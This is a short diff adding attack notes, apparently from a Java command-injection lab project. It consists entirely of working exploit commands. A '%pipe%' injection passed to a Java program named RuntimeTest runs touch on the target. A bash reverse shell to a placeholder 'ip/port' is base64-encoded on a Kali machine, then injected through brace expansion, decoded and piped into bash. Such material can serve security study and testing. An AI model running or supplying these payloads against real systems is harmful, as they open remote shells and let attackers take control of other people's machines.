@@ -1,0 +1,10 @@
+java RuntimeTest '%pipe%{touch,/u02/projects/JavaCommandInjection/dickbutt.txt} -sOutputFile=' test "/u02/projects/JavaCommandInjection/"
+
+:: base64 encode reverse shell
+
+root@kali:/u02/projects/JavaCommandInjection# echo 'bash -i >& /dev/tcp/ip/port 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK
+
+:: pass in argument with string expansion to obtain reverse shell
+
+java RuntimeTest '%pipe%{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK}|{base64,-d}|{bash,-i} -OutputFile=' test "/u01/project/JavaCommandInjection/"
